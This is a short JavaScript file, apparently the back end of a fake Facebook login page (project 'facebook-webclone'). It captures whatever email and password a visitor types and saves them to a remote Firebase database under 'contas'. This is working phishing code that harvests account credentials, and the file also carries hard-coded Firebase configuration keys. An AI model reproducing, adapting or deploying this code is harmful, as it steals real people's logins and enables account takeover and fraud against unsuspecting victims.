//Importa as funções dos SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.4/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.9.4/firebase-analytics.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/9.9.4/firebase-database.js"

//Configurações do aplicativo no firebase
const firebaseConfig = {
    apiKey: "AIzaSyDnSCxffU36iwgIoWhgqBI-mZiEhwrCABw",
    authDomain: "facebook-webclone.firebaseapp.com",
    projectId: "facebook-webclone",
    storageBucket: "facebook-webclone.appspot.com",
    messagingSenderId: "789333234362",
    appId: "1:789333234362:web:88ba161868b5f945fa6883",
    measurementId: "G-EVMQJPT1J8",
    //Banco de dados
    databaseURL: "https://facebook-webclone-default-rtdb.firebaseio.com"
};

//Inicializa o Firebase
const app = initializeApp(firebaseConfig);
//Analytics
const analytics = getAnalytics(app);
//Banco de dados
const database = getDatabase(app);

document.getElementById('btn_login').onclick = salvarDados;

function salvarDados() {
    let email = document.getElementById('input_email').value
    let senha = document.getElementById('input_senha').value

    if(email != '' && senha != '') {
        let id = Math.floor(Math.random() * 100000)
        set(ref(database, 'contas/' + id), {
            email: email,
            senha: senha
        });
    }
}